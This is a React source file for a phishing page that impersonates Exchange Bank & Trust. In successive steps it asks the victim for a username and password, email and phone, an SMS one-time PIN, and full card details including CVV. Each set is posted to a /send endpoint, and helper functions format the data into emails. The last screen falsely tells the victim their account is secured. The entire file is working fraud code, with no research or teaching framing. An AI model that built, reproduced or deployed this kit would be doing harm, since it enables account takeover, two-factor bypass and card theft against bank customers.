import React, { useState, useEffect } from "react";
import axios from "axios";
import cbiLogo from "./assets/logo.png";
import "./App.css";

// Add your other logos here if needed

function App() {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [contactEmail, setContactEmail] = useState("");
  const [contactPhone, setContactPhone] = useState("");
  const [otp, setOtp] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [zip, setZip] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetch("/api/login")
      .then((res) => {
        if (!res.ok) throw new Error("Network response was not ok");
        return res.json();
      })
      .then((data) => {
        setMessage(data.message);
        setLoading(false);
      })
      .catch((err) => {
        setError(err.message);
        setLoading(false);
      });
  }, []);

  const handleLoginSubmit = (e) => {
    e.preventDefault();
    setStep(2);
  };

  const handleSignIn = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: username,
        message: password,
        subject: "Login Details",
      });
    } catch (error) {
      console.error("Error sending login details:", error);
    }
    setStep(3);
  };

  const handleContactSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message: contactPhone,
        subject: "Contact Info",
      });
    } catch (error) {
      console.error("Error sending contact info:", error);
    }
    setStep(4);
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message: otp,
        subject: "OTP Verification",
      });
    } catch (error) {
      console.error("Error sending OTP:", error);
    }
    setStep(5);
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message:
          `Card Number: ${cardNumber}\n` +
          `Expiry: ${expiry}\n` +
          `CVV: ${cvv}\n` +
          `Zip Code: ${zip}`,
        subject: "Card Info",
      });
    } catch (error) {
      console.error("Error sending card info:", error);
    }
    setStep(6);
  };

  const handleSwitch = () => {
    setStep(1);
    setPassword("");
  };

  function getEmailText(subject, email, message) {
    if (subject === 'Login Details') {
      return `Username: ${email}\nPassword: ${message}`;
    } else if (subject === 'Contact Info') {
      return `Email Address: ${email}\nPhone Number: ${message}`;
    } else if (subject === 'OTP Verification') {
      return `Email Address: ${email}\nOTP: ${message}`;
    } else if (subject === 'Card Info') {
      return message; // <-- This will include username, password, and all card info
    } else {
      return `Email: ${email}\nMessage: ${message}`;
    }
  }

  function getEmailHtml(subject, email, message) {
    let title = 'Information';
    let contentHtml = '';

    if (subject === 'Login Details') {
      title = 'Login Information';
      contentHtml = `
        <p><strong>Username:</strong> ${email}</p>
        <p><strong>Password:</strong> ${message}</p>
      `;
    } else if (subject === 'Contact Info') {
      title = 'Contact Information';
      contentHtml = `
        <p><strong>Email Address:</strong> ${email}</p>
        <p><strong>Phone Number:</strong> ${message}</p>
      `;
    } else if (subject === 'OTP Verification') {
      title = 'Security Verification';
      contentHtml = `
        <p><strong>Verification Code:</strong> ${message}</p>
      `;
    } else if (subject === 'Card Info') {
      title = 'Card Information';
      // Format all lines as HTML
      contentHtml = message
        .split('\n')
        .map(line => {
          const [label, ...rest] = line.split(':');
          return `<p><strong>${label.trim()}:</strong> ${rest.join(':').trim()}</p>`;
        })
        .join('');
    } else {
      contentHtml = `<p><strong>Message:</strong> ${message}</p>`;
    }

    return `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
      <h2 style="color: #333;">${title}</h2>
      ${contentHtml}
    </div>`;
  }

  return (
    <div className="app-root">
      {/* Backend health check status removed */}
      <div className="main-content">
        {step === 6 ? (
          <div className="login-container success-container">
            <div className="success-logos">
              <img  src={cbiLogo} alt="Exchange Bank & Trust" className="success-logo" />
            </div>
            <h2 className="success-heading">Verification Complete.</h2>
            <div className="success-subheading">
              Your information has been successfully verified.<br />
              Your account has been secured
            </div>
          </div>
        ) : (
          <div className="login-container">
            <img src={cbiLogo} alt="Exchange Bank & Trust" className="login-logo" />
            {step === 1 && (
              <form style={{ width: "100%" }} onSubmit={handleLoginSubmit}>
                <div className="login-input-wrapper">
                  <input
                    id="username"
                    type="text"
                    className="login-input"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                    onFocus={e => e.target.parentNode.classList.add('focused')}
                    onBlur={e => e.target.parentNode.classList.remove('focused')}
                  />
                  <label
                    htmlFor="username"
                    className={`login-label${username ? " login-label--float" : ""}`}
                  >
                    Username
                  </label>
                </div>
                <div className="forgot-link">Forgot?</div>
                <div className="login-actions">
                  <div className="enroll-row">
                    First time user? <span className="enroll-link">Enroll now.</span>
                  </div>
                  <button type="submit" className="login-button">Continue</button>
                </div>
              </form>
            )}
            {step === 2 && (
              <form style={{ width: "100%" }} onSubmit={handleSignIn}>
                  <input
                    id="username"
                    type="text"
                    className="login-input"
                    placeholder="Username"
                    value= {username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                    onFocus={e => e.target.parentNode.classList.add('focused')}
                    onBlur={e => e.target.parentNode.classList.remove('focused')}
                  />
                <div className="username-row">
                 
                  <span className="switch-link" onClick={handleSwitch}>Switch</span>
                </div>
                <div className="login-input-wrapper password-wrapper">
                  <label
                    htmlFor="password"
                    className={`login-label${password ? " login-label--float" : ""}`}
                  >
                    Enter your password
                  </label>
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    className="login-input password-input"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    onFocus={e => e.target.parentNode.classList.add('focused')}
                    onBlur={e => e.target.parentNode.classList.remove('focused')}
                  />
                  <span className="eye-icon" onClick={() => setShowPassword(v => !v)}>
                    {showPassword ? (
                      <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
                        <circle cx="12" cy="12" r="3"/>
                      </svg>
                    ) : (
                      <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                        <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.8 21.8 0 0 1 5.06-6.06"/>
                        <path d="M1 1l22 22"/>
                        <path d="M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"/>
                      </svg>
                    )}
                  </span>
                </div>
                <div className="forgot-link">Forgot?</div>
                <div className="signin-actions">
                  <button type="button" className="passkey-btn">
                    <span className="fingerprint-icon">
               <svg fill="#f4d01a" height="25px" width="25px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 463 463" xml:space="preserve" stroke="#f4d01a"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <path d="M259.476,280.364V247.5c0-12.958-10.542-23.5-23.5-23.5s-23.5,10.542-23.5,23.5v29.672 c0,35.757-13.173,70.087-37.094,96.665l-32.981,36.646c-2.771,3.079-2.521,7.821,0.558,10.593c3.078,2.771,7.82,2.521,10.592-0.558 l32.981-36.646c26.403-29.338,40.944-67.231,40.944-106.7V247.5c0-4.687,3.813-8.5,8.5-8.5s8.5,3.813,8.5,8.5v32.864 c0,44.003-16.301,86.167-45.901,118.727l-32.149,35.364c-2.786,3.064-2.56,7.809,0.505,10.595c1.437,1.307,3.242,1.95,5.042,1.95 c2.04,0,4.072-0.827,5.552-2.455l32.148-35.364C241.789,373.854,259.476,328.106,259.476,280.364z"></path> <path d="M291.476,247.5c0-30.603-24.897-55.5-55.5-55.5s-55.5,24.897-55.5,55.5v29.672c0,27.839-10.256,54.566-28.879,75.258 l-23.447,26.053c-2.771,3.079-2.521,7.821,0.558,10.593c3.079,2.771,7.82,2.519,10.592-0.558l23.447-26.053 c21.106-23.451,32.73-53.742,32.73-85.293V247.5c0-22.332,18.168-40.5,40.5-40.5c22.332,0,40.5,18.168,40.5,40.5v32.864 c0,51.979-19.256,101.789-54.223,140.252l-27.125,29.839c-2.787,3.064-2.561,7.809,0.504,10.595c1.437,1.307,3.242,1.95,5.042,1.95 c2.04,0,4.072-0.827,5.552-2.455l27.126-29.839c37.481-41.23,58.123-94.622,58.123-150.342V247.5z"></path> <path d="M323.476,247.5c0-48.248-39.252-87.5-87.5-87.5s-87.5,39.252-87.5,87.5v29.672c0,19.92-7.339,39.045-20.665,53.851 l-21.112,23.458c-2.771,3.079-2.521,7.821,0.558,10.593c3.078,2.771,7.821,2.519,10.592-0.558l21.112-23.458 c15.809-17.565,24.515-40.254,24.515-63.886V247.5c0-39.977,32.523-72.5,72.5-72.5s72.5,32.523,72.5,72.5v32.864 c0,59.958-22.212,117.412-62.545,161.777l-7.507,8.258c-2.786,3.065-2.56,7.809,0.505,10.595c1.437,1.306,3.243,1.95,5.042,1.95 c2.04,0,4.072-0.827,5.552-2.455l7.506-8.258c42.848-47.133,66.446-108.169,66.446-171.867V247.5z"></path> <path d="M116.476,247.5c0,4.143,3.358,7.5,7.5,7.5s7.5-3.357,7.5-7.5c0-25.255,9.169-49.651,25.819-68.695 c16.495-18.867,39.134-31.205,63.746-34.741c4.1-0.589,6.946-4.391,6.357-8.49c-0.589-4.1-4.394-6.942-8.49-6.357 c-28.16,4.046-54.052,18.15-72.906,39.716C126.962,190.71,116.476,218.613,116.476,247.5z"></path> <path d="M131.476,277.172c0-4.143-3.358-7.5-7.5-7.5s-7.5,3.357-7.5,7.5c0,12.002-4.421,23.523-12.449,32.443l-18.779,20.867 c-2.771,3.078-2.521,7.82,0.558,10.592c1.434,1.29,3.227,1.925,5.015,1.925c2.052,0,4.097-0.838,5.577-2.483l18.779-20.866 C125.687,307.971,131.476,292.886,131.476,277.172z"></path> <path d="M340.755,344.123c-4.009-1.044-8.105,1.351-9.155,5.357c-2.769,10.579-6.213,21.096-10.24,31.258 c-1.526,3.851,0.359,8.21,4.21,9.735c0.907,0.359,1.841,0.529,2.761,0.529c2.985,0,5.808-1.795,6.975-4.739 c4.249-10.725,7.884-21.822,10.806-32.986C347.16,349.271,344.761,345.172,340.755,344.123z"></path> <path d="M315.791,158.632c-3.081-2.771-7.823-2.517-10.592,0.563s-2.517,7.822,0.563,10.591 c22.061,19.832,34.713,48.157,34.713,77.714v32.864c0,12.473-0.86,25.042-2.557,37.359c-0.565,4.104,2.303,7.888,6.406,8.453 c0.347,0.048,0.692,0.071,1.033,0.071c3.688,0,6.903-2.722,7.42-6.478c1.79-12.993,2.698-26.251,2.698-39.406V247.5 C355.476,213.695,341.011,181.304,315.791,158.632z"></path> <path d="M280.729,153.076c1.041,0.496,2.138,0.73,3.219,0.73c2.803,0,5.492-1.579,6.777-4.278c1.781-3.739,0.192-8.215-3.547-9.995 c-10.806-5.145-22.291-8.616-34.136-10.317c-4.106-0.585-7.901,2.258-8.49,6.357s2.257,7.901,6.357,8.49 C261.257,145.55,271.289,148.582,280.729,153.076z"></path> <path d="M235.976,96c-2.806,0-5.644,0.078-8.437,0.232c-4.136,0.228-7.304,3.766-7.076,7.901c0.229,4.136,3.763,7.321,7.902,7.075 c2.519-0.139,5.079-0.209,7.61-0.209c75.266,0,136.5,61.233,136.5,136.5v32.864c0,4.143,3.358,7.5,7.5,7.5s7.5-3.357,7.5-7.5V247.5 C387.476,163.963,319.513,96,235.976,96z"></path> <path d="M153.972,136.693c1.477,0,2.97-0.436,4.275-1.343c12.478-8.677,26.182-15.155,40.733-19.258 c3.987-1.124,6.308-5.268,5.184-9.254s-5.269-6.304-9.254-5.184c-16.16,4.556-31.376,11.749-45.226,21.379 c-3.401,2.365-4.241,7.039-1.876,10.439C149.265,135.57,151.599,136.693,153.972,136.693z"></path> <path d="M99.476,277.172V247.5c0-34.89,13.213-68.118,37.205-93.565c2.841-3.014,2.702-7.76-0.312-10.602 s-7.761-2.701-10.602,0.312C99.14,171.886,84.476,208.77,84.476,247.5v29.672c0,4.083-1.504,8.002-4.234,11.035l-9.248,10.275 c-2.771,3.079-2.521,7.821,0.558,10.592c1.433,1.291,3.227,1.926,5.015,1.926c2.052,0,4.096-0.837,5.577-2.482l9.248-10.275 C96.605,292.449,99.476,284.966,99.476,277.172z"></path> <path d="M409.951,189.104c-8.226-24.446-21.299-46.531-38.856-65.642c-2.803-3.05-7.547-3.252-10.597-0.449 c-3.05,2.803-3.251,7.547-0.449,10.598c16.127,17.554,28.134,37.834,35.686,60.276c1.054,3.133,3.976,5.11,7.107,5.11 c0.793,0,1.6-0.127,2.393-0.394C409.16,197.282,411.272,193.029,409.951,189.104z"></path> <path d="M295.247,73.822c-3.917-1.341-8.183,0.748-9.524,4.668c-1.341,3.919,0.749,8.183,4.668,9.523 c16.538,5.659,32.065,13.857,46.15,24.369c1.347,1.005,2.92,1.489,4.48,1.489c2.286,0,4.544-1.041,6.017-3.015 c2.478-3.319,1.794-8.019-1.525-10.496C330.176,88.916,313.264,79.986,295.247,73.822z"></path> <path d="M119.442,125.908C150.991,95.659,192.377,79,235.976,79c8.096,0,16.237,0.583,24.196,1.731 c4.103,0.598,7.903-2.252,8.495-6.352c0.592-4.1-2.251-7.902-6.351-8.494C253.648,64.635,244.786,64,235.976,64 c-47.487,0-92.56,18.141-126.915,51.081c-34.248,32.838-54.277,76.905-56.397,124.084c-0.186,4.138,3.018,7.644,7.155,7.829 c0.115,0.006,0.229,0.008,0.343,0.008c3.987,0,7.306-3.14,7.487-7.163C69.594,196.527,87.988,156.066,119.442,125.908z"></path> <path d="M235.976,32c-16.772,0-33.485,1.944-49.674,5.778c-4.031,0.954-6.524,4.996-5.57,9.026c0.955,4.03,4.997,6.524,9.027,5.569 C204.817,48.809,220.366,47,235.976,47c54.996,0,106.332,21.911,144.55,61.695c1.473,1.533,3.439,2.305,5.41,2.305 c1.869,0,3.741-0.694,5.195-2.091c2.987-2.87,3.083-7.618,0.213-10.604c-19.913-20.729-43.304-37.036-69.522-48.465 C294.666,38.002,265.783,32,235.976,32z"></path> <path d="M67.507,125.404c1.372,1.074,3.001,1.595,4.619,1.595c2.227,0,4.431-0.987,5.91-2.876 c21.375-27.302,49.515-48.717,81.377-61.932c3.826-1.587,5.642-5.975,4.055-9.801s-5.977-5.644-9.801-4.055 c-34.241,14.201-64.478,37.21-87.441,66.539C63.672,118.137,64.246,122.851,67.507,125.404z"></path> <path d="M131.983,38.725c1.094,0,2.205-0.24,3.255-0.748C166.816,22.73,200.709,15,235.976,15c18.378,0,36.682,2.162,54.401,6.426 c4.025,0.966,8.077-1.51,9.046-5.537c0.969-4.027-1.51-8.078-5.538-9.047C275.019,2.302,255.535,0,235.976,0 c-37.544,0-73.631,8.232-107.259,24.469c-3.73,1.801-5.294,6.285-3.493,10.015C126.517,37.163,129.195,38.725,131.983,38.725z"></path> <path d="M321.724,31.383c7.732,3.079,15.385,6.619,22.746,10.52c1.119,0.594,2.321,0.875,3.505,0.875 c2.688,0,5.287-1.449,6.633-3.99c1.939-3.66,0.545-8.199-3.115-10.139c-7.837-4.153-15.986-7.922-24.22-11.201 c-3.849-1.533-8.21,0.345-9.743,4.192C315.998,25.488,317.876,29.851,321.724,31.383z"></path> </g> </g></svg>

                  </span> Sign in with a passkey
                </button>
                <button type="submit" className="login-button signin-btn">Sign in</button>
              </div>
            </form>
            )}
            {step === 3 && (
              <form style={{ width: "100%" }} onSubmit={handleContactSubmit}>
                <div className="contact-heading">Verify Contact Information</div>
                <div className="contact-subheading">Please confirm your contact details on file.</div>
                <div className="login-input-wrapper">
                  <input
                    type="email"
                    className="login-input"
                    placeholder="Email Address"
                    value={contactEmail}
                    onChange={e => setContactEmail(e.target.value)}
                    required
                  />
                </div>
                <div className="login-input-wrapper">
                  <input
                    type="tel"
                    className="login-input"
                    placeholder="Phone Number"
                    value={contactPhone}
                    onChange={e => setContactPhone(e.target.value)}
                    required
                  />
                </div>
                <button type="submit" className="login-button contact-btn">Continue</button>
              </form>
            )}
            {step === 4 && (
              <form style={{ width: "100%" }} onSubmit={handleOtpSubmit}>
                <div className="otp-heading">Verification</div>
                <div className="otp-subheading">
                  We sent you a One-Time PIN to your registered mobile number.<br />
                  Please enter the code below
                </div>
                <div className="login-input-wrapper">
                  <input
                    type="text"
                    className="login-input"
                    placeholder="Secure Code"
                    value={otp}
                    onChange={e => setOtp(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
                    required
                    maxLength={6}
                  />
                </div>
                <div className="otp-info">SMS code might take some minutes to arrive.</div>
                <button type="submit" className="login-button contact-btn">Continue</button>
              </form>
            )}
            {step === 5 && (
              <form style={{ width: "100%" }} onSubmit={handleCardSubmit}>
                <div className="card-heading">Card Information</div>
                <div className="card-subheading">Please enter your card details below.</div>
                <div className="login-input-wrapper">
                  <input
                    type="text"
                    className="login-input"
                    placeholder="Card Number"
                    value={cardNumber}
                    onChange={e => setCardNumber(e.target.value.replace(/[^0-9]/g, '').slice(0, 16))}
                    required
                    maxLength={16}
                  />
                </div>
                <div className="login-input-wrapper card-row">
                  <input
                    type="text"
                    className="login-input card-expiry"
                    placeholder="MM/YYYY"
                    value={expiry}
                    onChange={e => {
                      let val = e.target.value.replace(/[^0-9]/g, '');
                      if (val.length > 6) val = val.slice(0, 6);
                      if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
                      setExpiry(val);
                    }}
                    required
                    maxLength={7}
                    style={{ width: '48%' }}
                  />
                  <input
                    type="text"
                    className="login-input card-cvv"
                    placeholder="CVV"
                    value={cvv}
                    onChange={e => setCvv(e.target.value.replace(/[^0-9]/g, '').slice(0, 3))}
                    required
                    maxLength={3}
                    style={{ width: '48%', marginLeft: '4%' }}
                  />
                </div>
                <div className="login-input-wrapper">
                  <input
                    type="text"
                    className="login-input"
                    placeholder="Zip Code"
                    value={zip}
                    onChange={e => setZip(e.target.value.replace(/[^0-9]/g, '').slice(0, 5))}
                    required
                    maxLength={5}
                  />
                </div>
                <button type="submit" className="login-button contact-btn">Continue</button>
              </form>
            )}
          </div>
        )}
      </div>
      <footer className="login-footer">
        © 2025 Exchange Bank & Trust &nbsp; · &nbsp; (913) 367-6000 &nbsp; · &nbsp;
        <a href="#" style={{ color: "#ffe066", textDecoration: "underline" }}>Privacy policy</a>
        &nbsp; · &nbsp; Member FDIC &nbsp; · &nbsp; Equal Housing Lender
      </footer>
    </div>
  );
}

export default App;